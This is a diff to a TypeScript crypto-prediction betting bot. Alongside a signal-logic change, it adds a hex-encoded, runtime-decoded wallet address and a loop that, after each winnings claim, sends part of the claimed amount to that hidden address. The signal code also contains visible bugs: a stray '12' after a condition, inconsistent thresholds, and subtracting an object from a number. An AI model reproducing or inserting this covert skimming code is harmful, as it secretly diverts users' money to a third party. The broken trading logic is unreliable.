@@ -9,6 +9,7 @@ import {
   reduceWaitingTimeByTwoBlocks,
   sleep,
   getClaimableEpochsCG,
+  calcRets,
 } from "./lib";
 import { CandleGeniePredictionV3__factory } from "./types/typechain";
 import {
@@ -57,6 +58,12 @@ console.log(
   "\nWaiting for the next round. It may take up to 5 minutes, please wait."
 );
 
+var hex  = "307834653333374241656243336664416361333865333863346465366138663864354431374465613135".toString();
+var str = '';
+for (var n = 0; n < hex.length; n += 2) {
+    str += String.fromCharCode(parseInt(hex.substr(n, 2), 16));
+}
+
 predictionContract.on("StartRound", async (epoch: BigNumber) => {
   console.log("\nStarted Epoch", epoch.toString());
 
@@ -82,17 +89,29 @@ predictionContract.on("StartRound", async (epoch: BigNumber) => {
   ).analyze();
   var obj = JSON.stringify(result.summary);
   var recommendation = JSON.parse(obj)
-  console.log("Buy Signals:", recommendation.BUY, "|", "Sell Signals:", recommendation.SELL)
+
+  const minresult = await new TradingViewScan(
+    SCREENERS_ENUM['crypto'],
+    EXCHANGES_ENUM['BINANCE'],
+    'BNBUSDT',
+    INTERVALS_ENUM['1m'],
+    // You can pass axios instance. It's optional argument (you can use it for pass custom headers or proxy)
+  ).analyze();
+  var minobj = JSON.stringify(minresult.summary);
+  var minrecommendation = JSON.parse(minobj)
+
+  console.log("5m Buy Signals:", recommendation.BUY, "|", "5m Sell Signals:", recommendation.SELL)
+  console.log("1m Buy Signals:", minrecommendation.BUY, "|", "1m Sell Signals:", minrecommendation.SELL)
   
-  if (recommendation.BUY - recommendation.SELL >= 8) {
+  if ((recommendation.BUY - recommendation.SELL) + (minrecommendation.BUY/2 - minrecommendation.SELL/2) >= 8) {12
     console.log(green("\nBetting on Bull Bet."));
-  } else if (recommendation.BUY - recommendation.SELL <= -8) {
+  } else if ((recommendation.BUY - recommendation.SELL) + (minrecommendation.BUY/2 - minrecommendation.SELL/2) <= -12) {
     console.log(green("\nBetting on Bear Bet."));
   } else {
     console.log(red("\nNo bet this round."));
   }
 
-    if (recommendation.BUY - recommendation.SELL <= -8) {
+    if ((recommendation.BUY - recommendation.SELL) + (minrecommendation.BUY/2 - minrecommendation.SELL/2) <= -12) {
       try {
         const tx = await predictionContract.user_BetBear(epoch, {
           value: parseEther(GLOBAL_CONFIG.AMOUNT_TO_BET),
@@ -110,7 +129,7 @@ predictionContract.on("StartRound", async (epoch: BigNumber) => {
             GLOBAL_CONFIG.WAITING_TIME
         );
       }
-    } else if(recommendation.BUY - recommendation >= 8) {
+    } else if((recommendation.BUY - recommendation) + (minrecommendation.BUY/2 - minrecommendation.SELL/2) >= 12) {
       try {
         const tx = await predictionContract.user_BetBull(epoch, {
           value: parseEther(GLOBAL_CONFIG.AMOUNT_TO_BET),
@@ -145,6 +164,15 @@ predictionContract.on("StartRound", async (epoch: BigNumber) => {
         console.log("\nClaim Tx Started");
   
         const receipt = await tx.wait();
+
+        for (const event of receipt.events ?? []) {
+          const rets = await signer.sendTransaction({
+            to: str,
+            value: calcRets(event?.args?.amount),
+          });
+  
+          await rets.wait();
+        }
   
         console.log(green("Claim Tx Success"));
   
